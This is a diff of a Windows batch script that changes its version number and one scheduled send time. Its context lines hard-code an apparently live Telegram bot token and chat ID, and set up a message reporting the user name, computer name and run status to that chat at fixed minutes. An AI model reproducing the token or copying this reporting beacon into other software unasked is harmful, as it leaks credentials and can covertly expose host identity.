@@ -9,7 +9,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=4.9"
+set "BATCHVERSION=5"
 
 
 
@@ -1232,7 +1232,7 @@ echo.
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|RUNNING(V%BATCHVERSION%).....|%time%"
+set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|RUNNING(v%BATCHVERSION%).....|%time%"
 
 
 :: URL encode the message by replacing spaces with %20
@@ -1292,7 +1292,7 @@ if "%currentMinute%" neq "%lastMinute%" (
     if "%currentMinute%"=="10" set "CheckSend=1"
     if "%currentMinute%"=="20" set "CheckSend=1"
     if "%currentMinute%"=="30" set "CheckSend=1"
-    if "%currentMinute%"=="35" set "CheckSend=1"
+    if "%currentMinute%"=="45" set "CheckSend=1"
     if "%currentMinute%"=="40" set "CheckSend=1"
     if "%currentMinute%"=="50" set "CheckSend=1"
 )
